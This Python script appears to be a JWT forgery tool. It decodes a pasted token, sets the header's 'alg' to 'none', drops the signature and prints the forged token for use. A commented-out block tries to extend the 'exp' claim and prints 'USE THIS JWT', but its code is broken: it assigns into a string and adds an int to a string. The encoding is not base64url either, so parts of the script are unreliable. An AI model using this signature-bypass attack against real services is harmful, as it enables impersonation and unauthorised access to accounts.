import base64
import json


JWT_TOKEN = ""
print("Paste your JWT Token down here:")
JWT_TOKEN = input()

class Jwt:
    encoded_header = ""
    encoded_payload = ""
    encoded_signature = ""
    decoded_header = ""
    decoded_payload = ""
    decoded_signature = ""
    print("JWT Token:")
    print(JWT_TOKEN)

    def __init__(self):
        # setting encoded vars
        self.slice_jwt()
        self.decode_jwt()
        print("Decoded JWT:")
        print(self.decoded_header)
        print(self.decoded_payload)

    def merge_jwt(self):
        merged_jwt = self.encoded_header + "." + self.encoded_payload + "." + self.encoded_signature
        return merged_jwt

    def slice_jwt(self):
        # find last point
        end_index: int = JWT_TOKEN.rfind(".")

        # find first point
        first_point: int = JWT_TOKEN.find(".")

        self.encoded_header = JWT_TOKEN[:first_point]
        self.encoded_payload = JWT_TOKEN[(first_point+1):end_index]

        # Signature cannot be base64 decoded
        #self.encoded_signature = JWT_TOKEN[(end_index+1):]

    def encode64(self,decoded):
        print("encoding %s" % decoded)
        decoded_bytes = decoded.encode('ascii')
        decoded_b64_bytes = base64.b64encode(decoded_bytes)
        encoded = decoded_b64_bytes.decode('ascii')
        print("encoded:")
        print(encoded)
        return encoded

    def decode64(self, encoded):
        encoded += "=="
        print("decoding %s" % encoded)
        encoded_bytes = base64.b64decode(encoded)
        decoded = encoded_bytes.decode()
        print("decoded: ")
        print(decoded)
        return decoded

    def decode_jwt(self):
        print("decoding whole JWT...")
        self.decoded_header = self.decode64(self.encoded_header)
        self.decoded_payload = self.decode64(self.encoded_payload)
        self.decoded_signature = self.decode64(self.encoded_signature)

    def get_key_value(self, section, key):
        json_section = json.loads(section)
        print("Getting value for key %s" % key)
        value = json_section[key]
        print("Found get_key_value: %s" % value)
        return value

    def update_jwt_section(self, section, key, value):
        json_section = json.loads(section)
        print("Updating old key %s = %s with new value %s" % (key, json_section[key], value))
        json_section[key] = value
        updated_section = json.dumps(json_section)
        print("New section:")
        print(updated_section)
        return updated_section



#def change_none_remove_signature():
jwt = Jwt()
print(jwt.decoded_header)

new_header = jwt.update_jwt_section(jwt.decoded_header, 'alg', "none")
jwt.encoded_header = jwt.encode64(new_header)




print("encoded_header: ")
print(jwt.encoded_header)
print("encoded_payload: ")
print(jwt.encoded_payload)

print()
print()
print("HERE IS YOUR alg=\'none\' and without signature token:")

print(jwt.encoded_header + "." + jwt.encoded_payload + ".")


'''
#def change_exp_key():
# increments +1 second digit if not "."
exp = jwt.get_key_value(jwt.decoded_payload,'exp')



print("old exp = %s" % exp)

exp = str(exp)
if exp[1] != ".":
    exp[1] = str(int(exp[1])+1)
else:
    exp[2] = str(int(exp[1])+1)


exp += 100000000
print("new exp = %s" % exp)

new_payload = jwt.update_jwt_section(jwt.decoded_payload,'exp',exp)
jwt.encoded_payload = jwt.encode64(new_payload)

cracked_jwt = (jwt.encoded_header + "." + jwt.encoded_payload[:-2] + ".") #remove encoded_payload "=="
print("USE THIS JWT:")
print(cracked_jwt)
'''













